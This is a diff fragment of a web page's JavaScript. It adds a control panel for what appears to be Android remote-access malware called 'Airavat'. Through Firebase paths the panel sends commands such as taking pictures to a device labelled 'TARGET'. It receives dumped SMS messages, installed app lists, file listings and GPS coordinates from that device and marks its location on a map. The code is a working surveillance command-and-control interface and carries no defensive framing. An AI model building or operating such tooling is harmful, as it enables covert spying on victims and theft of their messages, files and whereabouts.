-            if(page==='map') setTimeout(()=>map.invalidateSize(), 300);
-        }
-
-        function saveFile(url) {
-            let a = document.createElement('a'); a.href = url; a.target = '_blank'; a.download = 'file'; a.click();
-        }
-
-        function downloadTable(tableId, filename) {
-            let csv = [];
-            let rows = document.querySelectorAll(`#${tableId} tr`);
-            for (let i = 0; i < rows.length; i++) {
-                let row = [], cols = rows[i].querySelectorAll("td, th");
-                for (let j = 0; j < cols.length; j++) row.push('"' + cols[j].innerText + '"');
-                csv.push(row.join(","));
+                if(!hasDev) sel.innerHTML = '<option>NO ONLINE DEVICES</option>';
+            } else {
+                sel.innerHTML = '<option>SCANNING...</option>';
             }
-            let csvFile = new Blob([csv.join("\n")], {type: "text/csv"});
-            let link = document.createElement("a");
-            link.download = filename;
-            link.href = window.URL.createObjectURL(csvFile);
-            link.style.display = "none";
-            document.body.appendChild(link);
-            link.click();
-        }
+        });
+    }
 
-        function initMap() {
-            map = L.map('map').setView([20, 78], 4);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        }
-    </script>
-</body>
+    // --- 4. DEVICE HANDLER (Code B Logic) ---
+    function deviceChanged() {  
+        currentId = document.getElementById('device-select').value;  
+        if(!currentId || currentId.includes("SCAN")) return;  
+
+        // Update Dashboard Stats from /online node directly for speed
+        db.ref(`/online/onlinetheoneandonly/${currentId}/device`).once('value', snap => {
+            if(snap.exists()) {
+                const d = snap.val();
+                document.getElementById('stat-bat').innerText = d.battery + "%";
+                document.getElementById('stat-status').innerText = "ONLINE";
+                document.getElementById('stat-seen').innerText = d.phone;
+            }
+        });
+
+        // Listen for Responses (The Soul of Code B)
+        listenResponses();
+    }  
+
+    // --- 5. COMMAND SENDER (Code B Logic: /comds/) ---
+    function sendAiravatCmd(cmd, val1="", val2="") {
+        if(!currentId) return alert("NO TARGET");
+        
+        // Code B Path: /comds/comds{ID}/comdss
+        const path = `/comds/comds${currentId}/comdss`;
+        
+        const payload = {
+            cmdn: cmd,    // Command Name (e.g., 'tont', 'takepic')
+            cmdv: val1,   // Value 1 (e.g., duration)
+            cmdvar: val2, // Value 2
+            rndm: Math.floor(Math.random() * 90000) + 10000 // Trigger update
+        };
+
+        db.ref(path).set(payload);
+        console.log("CMD SENT:", payload);
+        
+        // Visual Feedback
+        const btn = event.currentTarget;
+        const originalText = btn.innerHTML;
+        btn.innerHTML = "SENT...";
+        setTimeout(() => btn.innerHTML = originalText, 1000);
+    }
+
+    // --- 6. RESPONSE LISTENER (Display Data in Code A UI) ---
+    function listenResponses() {
+        // Code B Responses: /respos/respo{ID}
+        db.ref(`/respos/respo${currentId}`).on('value', snap => {
+            if(!snap.exists()) return;
+            const d = snap.val();
+            const type = d.respo;
+            const data = d.v1;
+
+            if(!data) return;
+
+            // Route Data to Correct UI Section
+            if(type === 'dmpsms') {
+                document.querySelector('#table-sms tbody').innerHTML = `<tr><td><pre>${data}</pre></td></tr>`;
+            }
+            else if(type === 'getpackages') {
+                document.getElementById('app-list-container').innerHTML = `<pre style="color:#ccc; font-size:0.8rem">${data}</pre>`;
+            }
+            else if(type === 'filesmanager' || type === 'cd') {
+                 document.getElementById('file-list-container').innerHTML = `<pre style="color:var(--neon-blue)">${data}</pre>`;
+            }
+            else if(type === 'location' || type.includes('GPS')) {
+                // Try parsing location: "lat,long"
+                const parts = data.split(',');
+                if(parts.length >= 2) {
+                    const lat = parseFloat(parts[0]);
+                    const lng = parseFloat(parts[1]);
+                    if(!isNaN(lat)) {
+                        map.setView([lat, lng], 15);
+                        L.marker([lat, lng]).addTo(map).bindPopup("TARGET").openPopup();
+                    }
+                }
+            }
+            else {
+                // Fallback for generic data
+                console.log("RAW DATA:", type, data);
+            }
+        });
+    }
+
+    // --- HELPER FUNCTIONS ---
+    function nav(page) {  
+        document.querySelectorAll('.page').forEach(e => e.classList.remove('active'));  
+        document.getElementById('page-'+page).classList.add('active');  
+        document.querySelectorAll('.nav-icon').forEach(e => e.classList.remove('active'));  
+        event.currentTarget.classList.add('active');  
+        if(page==='map') setTimeout(()=>map.invalidateSize(), 300);  
+    }  
+
+    function logout() {
+        localStorage.removeItem('prof_key');
+        location.reload();
+    }
+
+    function initMap() { map = L.map('map').setView([20, 78], 4); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); }  
+</script>
+
+</body>  
 </html>
